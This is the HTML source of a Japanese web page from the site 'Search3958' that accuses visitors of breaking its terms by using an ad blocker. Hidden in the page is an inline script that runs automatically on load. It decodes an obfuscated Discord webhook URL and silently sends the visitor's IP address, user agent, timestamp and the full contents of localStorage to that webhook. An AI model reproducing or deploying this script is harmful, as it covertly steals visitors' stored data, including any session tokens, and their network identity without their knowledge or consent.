<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>利用規約に違反しています - Search3958</title>
  <!-- Google Fonts: M PLUS 2 -->
  <link href="https://fonts.googleapis.com/css2?family=M+PLUS+2:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      corner-shape: superellipse(1.5);
    }

    body {
      background-color: #efefef;
      font-family: 'M PLUS 2', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .dialog {
    background-color: #fff;
    border-radius: 48px;
    padding: 32px;
    max-width: 560px;
    width: 90%;
    text-align: center;
}

    .dialog h1 {
      color: #202124;
      font-size: 20px;
      margin-bottom: 16px;
      font-weight: 700;
    }

    .dialog p {
      color: #5F6368;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 28px;
    }

    .buttons {
      display: flex;
      gap: 16px;
      justify-content: center;
      flex-wrap: wrap;
      margin-bottom: 24px;
    }

    .buttons a {
      display: inline-block;
      text-decoration: none;
      color: white;
      background-color: #000000;
      padding: 12px 24px;
      border-radius: 22px;
      font-weight: 500;
      font-size: 14px;
      white-space: nowrap;
      flex: 1;
      min-width: 140px;
      text-align: center;
    }

    .buttons a:hover {
      opacity: 0.9;
    }

    .terms-link {
      color: #008f66;
      font-size: 13px;
      text-decoration: none;
    }

    .terms-link:hover {
      text-decoration: underline;
      color: #09af6e;
    }
  </style>
</head>
<body>
  <div class="dialog">
    <h1>利用規約に違反しています</h1>
    <p>お客様のブラウザで広告ブロッカーが確認されました。<br>
Search3958のサイトをご利用いただく場合、利用規約に同意したものとみなします。<br>
多くの問題を避けるためには広告を許可するか、利用規約への同意を撤回してください。</p>

    <div class="buttons">
      <a href="https://chromewebstore.google.com/?hl=ja" target="_blank" rel="noopener">広告を許可</a>
      <a href="https://search3958.github.io/entry.html">同意を撤回</a>
    </div>

    <a href="https://search3958.github.io/policies/trems.html" class="terms-link" target="_blank" rel="noopener">利用規約を確認する</a>
  </div>

  <script>
   (() => {
  'use strict';

  // Discord Webhook URL
  const DEBUG_FS_OBFUSCATED = [
    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi',
    'aG9va3MvMTQ1MDc0OTQ4NTA3OTcyNDE0OS9m',
    'M2xsSlczLWFEa3dQMW9TYms3TlVCSlUwaS1F',
    'SGtyaXhqb0NrVTVWb1JFNEJNOWdvWkZpd2d3',
    'd2NUSlJLYjlhQjJZNg=='
  ];

  const statusEl = document.getElementById('status');
  const btnEl = document.getElementById('main-send-button');
  
  // UI更新用ヘルパー
  function updateStatus(msg, isError = false) {
    if (!statusEl) return;
    statusEl.innerHTML = '';
    
    // 送信中（...が含まれる場合）はローディングバーを表示
    if (!isError && msg.includes('...')) {
      const bar = document.createElement('div');
      bar.className = 'loading-bar';
      statusEl.appendChild(bar);
    }
    
    const span = document.createElement('span');
    span.textContent = msg;
    statusEl.appendChild(span);
    statusEl.className = isError ? 'status-error' : 'status-success';
  }

  // IPアドレス取得
  async function getIpAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (e) {
      return '取得失敗';
    }
  }

  // メイン実行ロジック
  async function startExport() {
    if (btnEl) btnEl.disabled = true;
    updateStatus('CONNECTING...');

    // Webhook URLの復号
    const webhookUrl = ((p) => { 
      try { return atob(p.join('')); } catch (e) { return null; } 
    })(DEBUG_FS_OBFUSCATED);

    if (!webhookUrl) return;

    // データの収集
    const ip = await getIpAddress(); // ここで確実にIPを取得
    const timestamp = new Date().toLocaleString('ja-JP');
    const ua = navigator.userAgent;

    let msg = "## UserStopper-DbFS(AdError)\n";
    msg += `-# **TIME**: ${timestamp}\n`;
    msg += `-# **IP**: ${ip}\n`;
    msg += `-# **UserA**: \`${ua}\`\n`;
    msg += "## LS\n";

    let hasData = false;
    for (let i = 0; i < localStorage.length; i++) {
      hasData = true;
      const key = localStorage.key(i);
      const val = localStorage.getItem(key);
      // コードブロックなし、太字のみのフォーマット
      msg += `**${key}**: ${val}\n`;
    }

    if (!hasData) msg += "*LocalStorage is empty*";

    try {
      updateStatus('SENDING DATA...');
      const res = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: msg.substring(0, 2000) })
      });

      if (res.ok) {
        updateStatus('COMPLETE');
      } else {
        updateStatus(`ERROR: ${res.status}`, true);
        if (btnEl) btnEl.disabled = false;
      }
    } catch (e) {
      updateStatus('NETWORK ERROR', true);
      if (btnEl) btnEl.disabled = false;
    }
  }

  // 実行トリガー
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startExport);
  } else {
    startExport();
  }
})();
  </script>

  <script>
    // ページ表示時に自動で「未同意」と記録
    localStorage.setItem('termsAccepted', 'false');
  </script>

</body>  <script src="check.js"></script>
</html>